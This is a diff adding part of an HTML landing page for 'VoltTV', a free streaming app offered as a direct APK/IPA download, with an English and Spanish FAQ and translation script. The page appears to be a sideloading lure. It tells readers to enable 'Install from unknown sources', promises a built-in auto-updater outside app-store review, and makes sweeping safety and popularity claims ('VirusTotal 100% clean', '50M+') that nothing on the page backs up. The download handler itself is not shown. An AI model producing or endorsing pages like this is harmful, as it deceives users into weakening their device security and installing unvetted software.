+        <div class="dl-note" data-i18n="sec1_a">VirusTotal Scanned · 100% clean</div>
+      </div>
+    </section>
+
+    <!-- 08 FAQ -->
+    <section class="node">
+      <div class="lbl" data-i18n="faq_label">FAQ</div>
+      <h2 class="h2"><span data-i18n="faq_h_a">Got questions?</span> <em data-i18n="faq_h_b">We've got answers.</em></h2>
+      <div class="faqs">
+        <div class="faq"><button class="faq-q" onclick="toggleFaq(this)"><div class="faq-num">1</div><span data-i18n="faq1_q">Is the APK safe to install?</span><svg class="faq-arr" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="16" height="16"><polyline points="6 9 12 15 18 9"/></svg></button><div class="faq-a"><p data-i18n="faq1_a">Absolutely. Every release goes through VirusTotal scanning (72+ engines), SHA-256 code signing, and manual security review before publication. We never bundle adware, spyware, or unwanted software. You can verify the signature yourself using the hash published on our security page.</p></div></div>
+        <div class="faq"><button class="faq-q" onclick="toggleFaq(this)"><div class="faq-num">2</div><span data-i18n="faq2_q">Why isn't the app on Google Play or App Store?</span><svg class="faq-arr" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="16" height="16"><polyline points="6 9 12 15 18 9"/></svg></button><div class="faq-a"><p data-i18n="faq2_a">We're currently in a rapid iteration phase — shipping updates every 2 weeks with new features and improvements. Direct distribution lets us move faster without app store review delays. App store listings are planned for late 2026 once we hit our feature-complete milestone. Same app, same quality, just faster updates for you.</p></div></div>
+        <div class="faq"><button class="faq-q" onclick="toggleFaq(this)"><div class="faq-num">3</div><span data-i18n="faq3_q">How do I install the APK on Android?</span><svg class="faq-arr" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="16" height="16"><polyline points="6 9 12 15 18 9"/></svg></button><div class="faq-a"><p data-i18n="faq3_a">1. Tap the Download APK button above.<br>2. Open the downloaded .apk file.<br>3. If prompted, allow "Install from unknown sources" in Settings → Security.<br>4. Tap Install and you're done! The app will auto-update itself after that — no need to manually download future versions.</p></div></div>
+        <div class="faq"><button class="faq-q" onclick="toggleFaq(this)"><div class="faq-num">4</div><span data-i18n="faq4_q">Is it really free? What's the catch?</span><svg class="faq-arr" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="16" height="16"><polyline points="6 9 12 15 18 9"/></svg></button><div class="faq-a"><p data-i18n="faq4_a">Yes — 100% free. No hidden fees, no forced subscriptions, no paywalls on content. We're building our user base and believe that if we make the best streaming experience, growth follows. Premium features (like offline downloads and 4K) are also free during our launch period. Enjoy it while it lasts!</p></div></div>
+        <div class="faq"><button class="faq-q" onclick="toggleFaq(this)"><div class="faq-num">5</div><span data-i18n="faq5_q">Which devices and OS versions are supported?</span><svg class="faq-arr" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="16" height="16"><polyline points="6 9 12 15 18 9"/></svg></button><div class="faq-a"><p data-i18n="faq5_a">Android 8.0 (Oreo) and above for the APK. iOS 14+ for the IPA. Works on phones, tablets, Android TV, and Fire TV Stick. We recommend at least 2 GB of RAM for the best 4K streaming experience. Chromecast and AirPlay support are built in.</p></div></div>
+        <div class="faq"><button class="faq-q" onclick="toggleFaq(this)"><div class="faq-num">6</div><span data-i18n="faq6_q">How do I get updates after installing?</span><svg class="faq-arr" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" width="16" height="16"><polyline points="6 9 12 15 18 9"/></svg></button><div class="faq-a"><p data-i18n="faq6_a">The app has a built-in auto-updater. When a new version is available, you'll get a notification inside the app — just tap "Update" and it handles everything. No need to revisit this page or manually download again. We push updates every ~2 weeks with fixes and new features.</p></div></div>
+      </div>
+      <div class="foot">
+        <span data-i18n="footer_copy">© 2026 VoltTV</span>
+        <a href="#" data-i18n="footer_priv">Privacy</a>
+        <a href="#" data-i18n="footer_terms">Terms</a>
+        <a href="#" data-i18n="footer_sec">Security</a>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<!-- ============================================================
+     FIXED BOTTOM BAR
+     ============================================================ -->
+<div class="instbar">
+  <div class="instbar-icon"><img src="img/logo.jpg" alt="VoltTV"></div>
+  <div class="instbar-meta">
+    <div class="instbar-name">VoltTV</div>
+    <div class="instbar-sub"><svg viewBox="0 0 24 24" fill="currentColor"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg> 4.8 · 50M+</div>
+  </div>
+  <button class="instbar-btn" onclick="k2()" data-i18n="float_cta">Download Free</button>
+</div>
+
+<script>
+/* ---- FAQ ---- */
+function toggleFaq(q){var p=q.closest('.faq');var was=p.classList.contains('open');document.querySelectorAll('.faq').forEach(function(i){i.classList.remove('open')});if(!was)p.classList.add('open')}
+</script>
+
+<script>
+(function(){
+var T={
+en:{
+hero_eyebrow:'#1 Entertainment App · 2026',hero_title_a:'Cinema in your',hero_title_b:'pocket',hero_desc:'Stream blockbusters, binge series, download for offline — all in stunning 4K HDR. No ads. Ever.',hero_stat1:'Active Users',hero_stat2:'App Store',hero_stat3:'Quality',hero_cta:'Download Free — Start Watching',scroll_hint:'Swipe',trending_label:'Trending Now',trending_h_a:'What the world',trending_h_b:'is watching',trending_sub:'Top picks, updated daily',card_hot:'HOT',card_new:'NEW',card_top:'TOP',card_4k:'4K',card_hd:'HD',live_titles:'Titles',live_rating:'Rating',live_downloads:'Downloads',feat_label:'Why VoltTV',feat_h_a:'Everything you',feat_h_b:"need. Nothing you don't.",feat1_h:'4K HDR',feat1_p:'Dolby Vision & Atmos. Cinema-grade quality in your hands.',feat2_h:'Offline Mode',feat2_p:'Download anything. Watch on planes, trains, anywhere.',feat3_h:'Multi-Device',feat3_p:'Phone, tablet, TV — pause on one, resume on another.',feat4_h:'Early Access',feat4_p:'Exclusive premieres & behind-the-scenes before anyone else.',bigfeat_h:'⚡ Watch together, even apart',bigfeat_1:'<strong>Sync Play</strong> — watch in perfect sync with friends, anywhere in the world',bigfeat_2:'<strong>5 Profiles</strong> — each with personalized recommendations',bigfeat_3:'<strong>Kids Mode</strong> — safe, curated content for the little ones',bigfeat_4:'<strong>AI Subtitles</strong> — real-time translation in 40+ languages',reviews_label:'Loved by Millions',reviews_h_a:"Don't take our",reviews_h_b:'word for it',review1:'"Finally an app that actually delivers. The 4K quality is insane and offline downloads saved my commute. Cancelled everything else."',review2:'"Multi-device sync is flawless. I start on my TV, finish on my phone in bed. The library is massive and the AI recommendations are scary good."',review3:'"Kids Mode is a lifesaver. My children have their own space and I don\'t worry about what they\'ll find. Best streaming app for families hands down."',verified_user:'Verified User',stat1:'Downloads Worldwide',stat1_desc:'Downloads Worldwide',stat2:'Average Rating',stat3:'Countries Available',stat4:'Uptime Guarantee',sec_label:'Safe & Verified',sec_h_a:'Your security',sec_h_b:'is our priority',sec_sub:'Every release is scanned, signed, and verified before it reaches you.',sec1_a:'VirusTotal Scanned',sec1_b:'100% clean · 72 engines passed',sec2_a:'SHA-256 Signed',sec2_b:'Cryptographically verified · tamper-proof',sec3_a:'Auto-Update',sec3_b:'Get the latest version as soon as we release',sec4_a:'No Permissions Abuse',sec4_b:"Only requests what's strictly needed",faq_label:'FAQ',faq_h_a:'Got questions?',faq_h_b:"We've got answers.",faq1_q:'Is the APK safe to install?',faq1_a:'Absolutely. Every release goes through VirusTotal scanning (72+ engines), SHA-256 code signing, and manual security review before publication. We never bundle adware, spyware, or unwanted software. You can verify the signature yourself using the hash published on our security page.',faq2_q:"Why isn't the app on Google Play or App Store?",faq2_a:"We're currently in a rapid iteration phase — shipping updates every 2 weeks with new features and improvements. Direct distribution lets us move faster without app store review delays. App store listings are planned for late 2026 once we hit our feature-complete milestone. Same app, same quality, just faster updates for you.",faq3_q:'How do I install the APK on Android?',faq3_a:'1. Tap the Download APK button above.<br>2. Open the downloaded .apk file.<br>3. If prompted, allow "Install from unknown sources" in Settings → Security.<br>4. Tap Install and you\'re done! The app will auto-update itself after that — no need to manually download future versions.',faq4_q:"Is it really free? What's the catch?",faq4_a:"Yes — 100% free. No hidden fees, no forced subscriptions, no paywalls on content. We're building our user base and believe that if we make the best streaming experience, growth follows. Premium features (like offline downloads and 4K) are also free during our launch period. Enjoy it while it lasts!",faq5_q:'Which devices and OS versions are supported?',faq5_a:'Android 8.0 (Oreo) and above for the APK. iOS 14+ for the IPA. Works on phones, tablets, Android TV, and Fire TV Stick. We recommend at least 2 GB of RAM for the best 4K streaming experience. Chromecast and AirPlay support are built in.',faq6_q:'How do I get updates after installing?',faq6_a:'The app has a built-in auto-updater. When a new version is available, you\'ll get a notification inside the app — just tap "Update" and it handles everything. No need to revisit this page or manually download again. We push updates every ~2 weeks with fixes and new features.',footer_copy:'© 2026 VoltTV',footer_priv:'Privacy',footer_terms:'Terms',footer_sec:'Security',float_cta:'Download Free'
+},
+es:{
+hero_eyebrow:'#1 App de Entretenimiento · 2026',hero_title_a:'Cine en tu',hero_title_b:'bolsillo',hero_desc:'Transmite blockbusters, series completas, descarga para ver sin conexión — todo en impresionante 4K HDR. Sin anuncios. Nunca.',hero_stat1:'Usuarios Activos',hero_stat2:'App Store',hero_stat3:'Calidad',hero_cta:'Descargar Gratis — Comienza a Ver',scroll_hint:'Desliza',trending_label:'Tendencias',trending_h_a:'Lo que el mundo',trending_h_b:'está viendo',trending_sub:'Selecciones principales, actualizadas a diario',card_hot:'POPULAR',card_new:'NUEVO',card_top:'TOP',card_4k:'4K',card_hd:'HD',live_titles:'Títulos',live_rating:'Puntuación',live_downloads:'Descargas',feat_label:'Por Qué VoltTV',feat_h_a:'Todo lo que',feat_h_b:'necesitas. Nada más.',feat1_h:'4K HDR',feat1_p:'Dolby Vision y Atmos. Calidad cinematográfica en tus manos.',feat2_h:'Modo Sin Conexión',feat2_p:'Descarga lo que quieras. Mira en aviones, trenes, donde sea.',feat3_h:'Multi-Dispositivo',feat3_p:'Teléfono, tablet, TV — pausa en uno, continúa en otro.',feat4_h:'Acceso Anticipado',feat4_p:'Estrenos exclusivos y contenido detrás de cámaras antes que nadie.',bigfeat_h:'⚡ Mira juntos, incluso separados',bigfeat_1:'<strong>Sync Play</strong> — mira en perfecta sincronía con amigos, en cualquier parte del mundo',bigfeat_2:'<strong>5 Perfiles</strong> — cada uno con recomendaciones personalizadas',bigfeat_3:'<strong>Modo Niños</strong> — contenido seguro y curado para los más pequeños',bigfeat_4:'<strong>Subtítulos IA</strong> — traducción en tiempo real en más de 40 idiomas',reviews_label:'Amado por Millones',reviews_h_a:'No creas solo',reviews_h_b:'nuestra palabra',review1:'"Por fin una app que cumple. La calidad 4K es increíble y las descargas sin conexión salvaron mi viaje. Cancelé todo lo demás."',review2:'"La sincronización multi-dispositivo es perfecta. Empiezo en mi TV, termino en mi teléfono en la cama. La biblioteca es enorme y las recomendaciones de IA son increíblemente precisas."',review3:'"El Modo Niños es un salvavidas. Mis hijos tienen su propio espacio y no me preocupa lo que puedan encontrar. Mejor app de streaming para familias sin duda."',verified_user:'Usuario Verificado',stat1:'Descargas en Todo el Mundo',stat1_desc:'Descargas en Todo el Mundo',stat2:'Puntuación Media',stat3:'Países Disponibles',stat4:'Garantía de Disponibilidad',sec_label:'Seguro y Verificado',sec_h_a:'Tu seguridad es',sec_h_b:'nuestra prioridad',sec_sub:'Cada versión es analizada, firmada y verificada antes de llegar a ti.',sec1_a:'VirusTotal Analizado',sec1_b:'100% limpio · 72 motores aprobados',sec2_a:'Firmado SHA-256',sec2_b:'Verificado criptográficamente · a prueba de manipulaciones',sec3_a:'Actualización Automática',sec3_b:'Recibe la última versión tan pronto como la publicamos',sec4_a:'Sin Abuso de Permisos',sec4_b:'Solo solicita lo estrictamente necesario',faq_label:'Preguntas Frecuentes',faq_h_a:'¿Tienes preguntas?',faq_h_b:'Tenemos respuestas.',faq1_q:'¿Es seguro instalar el APK?',faq1_a:'Absolutamente. Cada versión pasa por el análisis de VirusTotal (más de 72 motores), firma de código SHA-256 y revisión de seguridad manual antes de su publicación. Nunca incluimos adware, spyware ni software no deseado. Puedes verificar la firma tú mismo usando el hash publicado en nuestra página de seguridad.',faq2_q:'¿Por qué la app no está en Google Play o App Store?',faq2_a:'Estamos en una fase de iteración rápida — publicando actualizaciones cada 2 semanas con nuevas funciones y mejoras. La distribución directa nos permite avanzar más rápido sin los retrasos de revisión de las tiendas de aplicaciones. Las publicaciones en tiendas están planificadas para finales de 2026 una vez que alcancemos nuestro hito de funciones completas. La misma app, la misma calidad, solo que con actualizaciones más rápidas para ti.',faq3_q:'¿Cómo instalo el APK en Android?',faq3_a:'1. Toca el botón Descargar APK arriba.<br>2. Abre el archivo .apk descargado.<br>3. Si se te solicita, permite "Instalar desde fuentes desconocidas" en Configuración → Seguridad.<br>4. ¡Toca Instalar y listo! La app se actualizará automáticamente después — no necesitas descargar manualmente versiones futuras.',faq4_q:'¿Es realmente gratis? ¿Cuál es la trampa?',faq4_a:'Sí — 100% gratis. Sin cargos ocultos, sin suscripciones forzadas, sin muros de pago en el contenido. Estamos construyendo nuestra base de usuarios y creemos que si hacemos la mejor experiencia de streaming, el crecimiento llega solo. Las funciones premium (como descargas sin conexión y 4K) también son gratuitas durante nuestro período de lanzamiento. ¡Disfrútalas mientras dure!',faq5_q:'¿Qué dispositivos y versiones de SO son compatibles?',faq5_a:'Android 8.0 (Oreo) y superior para el APK. iOS 14+ para el IPA. Funciona en teléfonos, tabletas, Android TV y Fire TV Stick. Recomendamos al menos 2 GB de RAM para la mejor experiencia de streaming 4K. Chromecast y AirPlay están integrados.',faq6_q:'¿Cómo obtengo actualizaciones después de instalar?',faq6_a:'La app tiene un actualizador automático integrado. Cuando una nueva versión esté disponible, recibirás una notificación dentro de la app — solo toca "Actualizar" y se encarga de todo. No necesitas volver a visitar esta página ni descargar manualmente de nuevo. Publicamos actualizaciones aproximadamente cada 2 semanas con correcciones y nuevas funciones.',footer_copy:'© 2026 VoltTV',footer_priv:'Privacidad',footer_terms:'Términos',footer_sec:'Seguridad',float_cta:'Descargar Gratis'
+}
+};
+var lang=(function(){var p=window.location.pathname.toLowerCase();if(p.indexOf('estv')!==-1)return 'es';if(p.indexOf('index')!==-1)return 'en';var s=localStorage.getItem('sflix_lang');if(s==='en'||s==='es')return s;return 'en'})();
+function applyLanguage(l){
+document.documentElement.lang=l;var els=document.querySelectorAll('[data-i18n]');
+for(var i=0;i<els.length;i++){var k=els[i].getAttribute('data-i18n');if(T[l]&&T[l][k]!==undefined){var v=T[l][k];if(v.indexOf('<')!==-1&&v.indexOf('>')!==-1){els[i].innerHTML=v}else{els[i].textContent=v}}}
+if(l==='es'){document.title='VoltTV — Cine en tu Bolsillo';var md=document.querySelector('meta[name="description"]');if(md)md.setAttribute('content','VoltTV — Transmite blockbusters, series completas y mira sin conexión en 4K HDR. Sin anuncios. Descarga el APK gratis para Android.')}
+localStorage.setItem('sflix_lang',l)
+}
+applyLanguage(lang);
+})();
+</script>
+</body>
+</html>
